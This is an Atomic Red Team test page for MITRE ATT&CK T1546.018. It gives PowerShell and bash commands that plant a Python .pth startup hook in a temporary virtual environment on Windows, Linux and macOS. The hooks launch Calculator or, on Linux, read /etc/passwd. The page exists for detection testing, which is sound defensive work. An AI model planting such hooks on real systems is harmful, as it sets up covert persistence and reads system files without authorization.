# T1546.018 - Event Triggered Execution: Python Startup Hooks
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1546/018)
<blockquote>

Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked.(Citation: Volexity GlobalProtect CVE 2024)

Path configuration files are designed to extend Python’s module search paths through the use of import statements. If a `.pth` file is placed in Python's `site-packages` or `dist-packages` directories, any lines beginning with `import` will be executed automatically on Python invocation.(Citation: DFIR Python Persistence 2025) Similarly, if `sitecustomize.py` or `usercustomize.py` is present in the Python path, these files will be imported during interpreter startup, and any code they contain will be executed.(Citation: Python Site Configuration Hook)

Adversaries may abuse these mechanisms to establish persistence on systems where Python is widely used (e.g., for automation or scripting in production environments).  

</blockquote>

## Atomic Tests

- [Atomic Test #1 - Python Startup Hook Execution via .pth (Windows)](#atomic-test-1---python-startup-hook-execution-via-pth-windows)

- [Atomic Test #2 - Python Startup Hook Execution via .pth (Linux)](#atomic-test-2---python-startup-hook-execution-via-pth-linux)

- [Atomic Test #3 - Python Startup Hook Execution via .pth (macOS)](#atomic-test-3---python-startup-hook-execution-via-pth-macos)


<br/>

## Atomic Test #1 - Python Startup Hook Execution via .pth (Windows)
Creates a Python startup hook using a .pth file inside a virtual environment on Windows.

**Supported Platforms:** Windows


**auto_generated_guid:** b4773c6b-3aa0-44a2-830a-b6ff594a0fb2





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| exe_name | Executable to launch | string | calc.exe|
| python_path | Path to Python interpreter | path | python.exe|


#### Attack Commands: Run with `powershell`! 


```powershell
$TempDir = Join-Path $env:TEMP ("atomic_python_hook_" + [guid]::NewGuid())
New-Item -ItemType Directory -Path $TempDir | Out-Null
Set-Location $TempDir
Set-Content -Path "$env:TEMP\atomic_python_hook_path.txt" -Value $TempDir
& "#{python_path}" -m venv env
$SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
"import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['#{exe_name}']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
& "$TempDir\env\Scripts\python.exe" -c "print('Interpreter started')"
```

#### Cleanup Commands:
```powershell
Get-Process CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force
if (Test-Path "$env:TEMP\atomic_python_hook_path.txt") {
  $TempDir = Get-Content "$env:TEMP\atomic_python_hook_path.txt"
  Remove-Item -Recurse -Force $TempDir -ErrorAction SilentlyContinue
  Remove-Item "$env:TEMP\atomic_python_hook_path.txt" -Force }
```



#### Dependencies:  Run with `powershell`!
##### Description: Ensure Python is installed
##### Check Prereq Commands:
```powershell
if (Get-Command #{python_path} -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```
##### Get Prereq Commands:
```powershell
Write-Host "Python not found. Please install it from https://www.python.org/downloads/windows/ or via 'winget install Python.Python.3'"
```




<br/>
<br/>

## Atomic Test #2 - Python Startup Hook Execution via .pth (Linux)
Creates a Python startup hook using a .pth file inside a virtual environment on Linux.

**Supported Platforms:** Linux


**auto_generated_guid:** 85f21c19-18ef-4450-98d8-05bb7b0e1887





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| python_path | Path to Python interpreter | path | python3|


#### Attack Commands: Run with `bash`! 


```bash
PYTHON_EXE=$(command -v #{python_path})
TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX)
echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
$PYTHON_EXE -m venv "$TEMPDIR/env"
SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site; print(site.getsitepackages()[0])")
echo "import sys, os; (not hasattr(sys, 'hook_run')) and (setattr(sys, 'hook_run', True) or os.system('cat /etc/passwd'))" > "$SITE_PACKAGES/atomic_hook.pth"
"$TEMPDIR/env/bin/python" -c "print('Interpreter started')"
```

#### Cleanup Commands:
```bash
rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
```



#### Dependencies:  Run with `bash`!
##### Description: Ensure Python is installed
##### Check Prereq Commands:
```bash
command -v
```
##### Get Prereq Commands:
```bash
echo "Python3 not found. Please install it using your package manager (e.g., 'sudo apt install python3' or 'sudo yum install python3')."
```




<br/>
<br/>

## Atomic Test #3 - Python Startup Hook Execution via .pth (macOS)
Creates a Python startup hook using a .pth file inside a virtual environment on macOS.

**Supported Platforms:** macOS


**auto_generated_guid:** 858b4aed-d76f-443d-a801-5454ea56dee0





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| exe_name | App to launch | string | Calculator|
| python_path | Path to Python interpreter | path | python3|


#### Attack Commands: Run with `bash`! 


```bash
PYTHON_EXE=$(command -v #{python_path})
TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX)
echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt
$PYTHON_EXE -m venv "$TEMPDIR/env"
SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site; print(site.getsitepackages()[0])")
echo "import subprocess; subprocess.Popen(['open', '-a', '#{exe_name}'])" > "$SITE_PACKAGES/atomic_hook.pth"
"$TEMPDIR/env/bin/python" -c "print('Interpreter started')"
```

#### Cleanup Commands:
```bash
pkill "#{exe_name}" || true
[ -f /tmp/atomic_python_hook_path.txt ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
```



#### Dependencies:  Run with `bash`!
##### Description: Ensure Python is installed
##### Check Prereq Commands:
```bash
command -v
```
##### Get Prereq Commands:
```bash
echo "Python3 not found. Please install it using Homebrew ('brew install python') or the macOS developer tools ('xcode-select --install')."
```




<br/>
